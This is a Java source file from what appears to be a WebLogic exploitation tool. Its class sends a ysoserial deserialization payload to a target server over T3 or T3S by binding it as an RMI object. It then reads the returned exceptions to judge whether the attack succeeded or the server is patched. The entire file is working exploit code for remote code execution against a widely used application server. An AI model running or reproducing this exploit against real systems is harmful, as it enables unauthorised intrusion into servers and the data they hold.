/*
	WLNamingtExploit.java
	
	v0.3 ()
	
	Class for executing java deserialization exploit against WebLogic Servers by way of WebLogic RMI remote object binding (runWLBindExploit). For T3S connections, JVM SSL/TLS
	settings (enabled protocol(s), disabling certification validation, etc.) must be configured BEFORE calling runWLBindExploit method.
*/

package bort.millipede.wlt3;

import java.rmi.Remote;
import java.rmi.MarshalException;
import java.rmi.UnknownHostException;

//third-party includes
import weblogic.rmi.Naming;
import weblogic.rjvm.PeerGoneException;
import ysoserial.payloads.util.Gadgets;

class WLNamingExploit {
	//Run deserialization exploit by sending payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)
	//if using T3S, desired SSL/TLS protocols must be enabled/disabled prior to method call
	static void runWLBindExploit(Object payload,String host,int port,boolean t3s,boolean verbose) {
		String protocol = "t3";
		if(t3s) protocol = "t3s";
		
		try {
			Naming.bind(protocol+"://"+host+":"+Integer.toString(port)+"/Mcgarnigal"+System.nanoTime(),Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned"+System.nanoTime(),payload),Remote.class)); //WebLogic T3 RMI bind-based exploitation
			System.out.println("No Exception(s) thrown, exploitation appears successful!");
		} catch(MarshalException me) {
			System.out.print("\b\b\b\bsucceeded!\n");
			System.out.println("Executing \"WLBind\" exploit method: ");
			
			Throwable cause = me.getCause();
			if(cause!=null) {
				String eType = cause.getClass().getName();
				switch(eType) {
					case "javax.naming.NoPermissionException": //no permission to bind remote object: this is normal
						System.out.println("javax.naming.NoPermissionException thrown, but this is normal for \"WLBind\" exploit method. Exploitation appears successful!"+(verbose ? "" : "\nRe-run with --verbose option to see full Exception output!"));
						break;
					default: //Unknown Marshal Error
						System.err.println("Unknown Marshal Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
				}
			} else {
				System.err.println("Unknown Marshal Error occurred!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}
			
			if(verbose) { //print stack trace output if --verbose option is set
				System.err.print("\n");
				me.printStackTrace();
			}
		} catch(PeerGoneException pge) { //Server forcefully closed connection, so server is likely patched
			System.out.print("\b\b\b\bsucceeded!\n");
			System.out.println("Executing \"WLBind\" exploit method: ");
			System.err.println("Target WebLogic Server at "+protocol+"://"+host+":"+port+" forcefully closed "+protocol.toUpperCase()+" connection! Server seems to be patched!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) { //print stack trace output if --verbose option is set
				System.err.print("\n");
				pge.printStackTrace();
			}
		} catch(UnknownHostException uhe) {
			System.out.print("\b\b\b\bfailed!\n");
			
			Throwable cause = uhe.getCause();
			if(cause!=null) {
				String eType = cause.getClass().getName();
				switch(eType) {
					case "javax.naming.CommunicationException":
						String message = uhe.getMessage();
						if(message.contains("java.io.IOException: Empty server reply")) { //Server may not be WebLogic server
							System.err.println("Target Server/Port at "+host+":"+port+" does not appear to be running "+protocol.toUpperCase()+"! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("java.net.ConnectException: Connection refused")) { //host is down or port is closed
							System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" refused! Target host appears to be down or port is closed!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						} else if(message.contains("javax.net.ssl.SSLHandshakeException")) {
							if(message.contains("handshake_failure")) { //SSL Handshake failed due to mismatched supported protocols
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed (Handshake Error)! Try a different SSL/TLS connection protocol!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else if(message.contains("Remote host closed connection during handshake")) { //SSL Handshake failed due to server not supporting encrypted connections
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed, Remote host closed connection during handshake! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else { //SSL Handshake failed because server may only support clear-text connection
								System.err.println(protocol.toUpperCase()+" Connection to "+host+":"+Integer.toString(port)+" failed! Target host/port may not be running an SSL/TLS service!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else if(message.contains("weblogic.socket.UnrecoverableConnectException") && message.contains("Login failed for an unknown reason")) {
							if(protocol.toUpperCase().equals("T3")) { //clear-text connection failed because server only supports encrypted connection
								System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Service may be running with SSL/TLS (use --t3s option)!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							} else { //Server may not be WebLogic server
								System.err.println("Target Server/Port at "+host+":"+port+" forcefully reset "+protocol.toUpperCase()+" connection! Target may not be a WebLogic Server!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
							}
						} else { //Unknown Host Communication Error
							System.err.println("Unknown Host Communication Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						}
						break;
					default: //Unknown Host Error
						System.err.println("Unknown Host Error occurred ("+eType+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
						break;
				}
			} else { //Unknown Host Error
				System.err.println("Unknown Host Error occurred"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			}

			if(verbose) { //print full stack trace output if --verbose option is set
				System.err.print("\n");
				uhe.printStackTrace();
			}
		} catch(Exception e) { //Unknown error
			System.err.println("Unknown Error occurred ("+e.getClass().getName()+")!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
			if(verbose) {
				System.err.print("\n");
				e.printStackTrace();
			}
		}
	}
}

